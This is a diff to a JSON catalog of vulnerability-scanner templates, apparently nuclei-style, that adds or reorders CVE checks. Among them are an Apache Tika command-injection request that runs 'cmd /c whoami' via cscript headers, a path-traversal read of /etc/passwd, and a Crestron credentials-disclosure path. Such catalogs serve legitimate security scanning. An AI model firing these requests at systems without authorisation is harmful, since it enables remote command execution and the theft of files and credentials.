@@ -6006,11 +6006,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -14150,6 +14150,21 @@
       ]
     },
     {
+      "id": "CVE-2021-39433",
+      "info": {
+        "name": "BIQS IT Biqs-drive v1.83 LFI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/download/index.php?file=../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-39501",
       "info": {
         "name": "EyouCMS 1.5.4 Open Redirect",
@@ -14835,6 +14850,36 @@
           "method": "GET",
           "path": [
             "{{RootURL}}/apisix/admin/migrate/export"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0218",
+      "info": {
+        "name": "HTML Email Template Designer < 3.1 - Stored Cross-Site Scripting (XSS)",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?rest_route=/whm/v3/themesettings"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-23178",
+      "info": {
+        "name": "Crestron Device - Credentials Disclosure",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/aj.html?a=devi"
           ]
         }
       ]
